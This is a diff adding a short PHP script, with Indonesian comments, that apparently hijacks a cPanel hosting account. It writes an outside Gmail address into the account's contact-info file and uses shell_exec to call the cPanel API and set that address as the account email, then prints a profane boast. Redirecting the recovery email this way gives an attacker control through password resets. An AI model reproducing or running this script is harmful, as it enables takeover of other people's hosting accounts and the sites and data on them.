@@ -1,0 +1,9 @@
+<?php
+$user = 'stppmeda';
+$newEmail = 'happyasmara772@gmail.com';
+// UBAH DI FILE CONTACTINFO
+file_put_contents("/home/stppmeda/.cpanel/contactinfo", $newEmail);
+// KALO ADA AKSES KE CPANEL API, LO BISA PAKE:
+$cpapi = shell_exec("/usr/local/cpanel/bin/cpanel_api --user=$user set_contact_email $newEmail");
+echo "EMAIL DIUBAH, BANGSAT!";
+?>
